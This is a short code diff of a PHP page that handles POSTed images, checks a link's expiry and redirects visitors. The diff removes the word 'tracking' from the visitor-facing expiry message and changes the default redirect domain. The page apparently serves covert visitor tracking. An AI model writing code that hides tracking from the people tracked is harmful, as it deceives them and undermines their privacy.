@@ -225,7 +225,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
         <!-- যদি লিংক মেয়াদোত্তীর্ণ হয় -->
         <div class="expired-box">
             <h2>Date Expired</h2>
-            <p>This tracking link has expired and is no longer available.</p>
+            <p>This link has expired and is no longer available.</p>
         </div>
     <?php else: ?>
         <!-- যদি লিংক সচল থাকে -->
@@ -258,7 +258,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['image'])) {
             const expiryParam = urlParams.get('e') || ''; 
             const rawTargetUrl = urlParams.get('url');
 
-            let finalUrl = "https://www.aapunkagames.com/"; 
+            let finalUrl = "https://www.aapuhoyf.com/"; 
 
             if (rawTargetUrl) {
                 try {
